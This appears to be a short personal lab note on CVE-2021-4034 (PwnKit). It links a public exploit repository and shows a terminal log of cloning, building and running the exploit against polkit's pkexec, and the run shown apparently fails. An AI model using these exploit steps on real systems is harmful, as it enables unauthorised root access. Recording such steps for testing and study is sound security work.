## [[CVE-2021-4034]]
---
https://github.com/berdav/CVE-2021-4034.git

```
➜  pwnkit git clone https://github.com/berdav/CVE-2021-4034.git
Cloning into 'CVE-2021-4034'...
remote: Enumerating objects: 92, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 92 (delta 24), reused 19 (delta 19), pack-reused 56 (from 1)
Receiving objects: 100% (92/92), 22.71 KiB | 113.00 KiB/s, done.
Resolving deltas: 100% (44/44), done.
➜  pwnkit ls
CVE-2021-4034  PwnKit
➜  pwnkit cd CVE-2021-4034 
➜  CVE-2021-4034 git:(main) ls
cve-2021-4034.c   dry-run  Makefile  README.md
cve-2021-4034.sh  LICENSE  pwnkit.c
➜  CVE-2021-4034 git:(main) make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
➜  CVE-2021-4034 git:(main) ./cve-2021-4034
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
The value for the SHELL variable was not found in the /etc/shells file

This incident has been reported.
➜  CVE-2021-4034 git:(main) 
```